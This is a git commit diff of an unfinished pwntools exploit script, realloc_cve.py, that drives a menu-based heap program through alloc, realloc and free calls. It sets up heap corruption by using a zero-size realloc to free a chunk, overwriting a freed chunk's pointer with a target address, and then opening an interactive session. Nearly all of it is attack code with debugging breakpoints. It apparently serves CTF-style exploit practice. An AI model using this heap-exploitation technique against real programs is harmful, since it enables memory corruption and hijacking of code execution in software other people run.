cb60844ef63851df854520540e03013f2e389e2a
dkmos2016 <dkmos2016@126.com>
2020-12-24 03:41:14 -0600

    update realloc_cve.py(todo)

--- realloc_cve.py
+++ realloc_cve.py
@@ -11,11 +11,12 @@ def alloc(idx, sz, cont):
   p.sendlineafter('Size:', str(sz))
   p.sendlineafter('Data:', cont)
 
-def realloc(idx, sz, cont):
+def realloc(idx, sz, cont=None):
   p.sendlineafter('Your choice: ', '2')
   p.sendlineafter('Index:', str(idx))
   p.sendlineafter('Size:', str(sz))
-  p.sendlineafter('Data:', cont)
+  if cont:
+    p.sendlineafter('Data:', cont)
 
 def free(idx):
   p.sendlineafter('Your choice: ', '3')
@@ -37,13 +38,24 @@ context.log_level = 'debug'
 if __name__ == "__main__":
   pdb.set_trace()
   
-  alloc(0, 0x28, 'a' * 0x20 + p64(0x40))
-  alloc(1, 0x68, 'b' * 0x60 + p64(0x30))
+  alloc(0, 0x78, 'a' * 0x70 + p64(0x40))
+  alloc(1, 0x38, 'b' * 0x30 + p64(0x30))
   # realloc(0, 0x60, 'c' * 0x30)
-  free(0)
-  alloc(0, 0x68, 'a' * 0x60 + p64(0x40))
 
+  realloc(0, 0, 'c' * 0)
+  # realloc(0, 0x30, p64(0x403ff5-8) + 'c' * 0x18)
+
+  pdb.set_trace()
+  realloc(0, 0x70, p64(0x403ff5-8) + 'd' * 0x28 + chr(0x40))
   free(1)
+  alloc(1, 0x78, 'd')
 
+  free(0)
+
+
+  # realloc(0, 0, 'c' * 0)
+
+
+  # free(1)
 
   p.interactive()
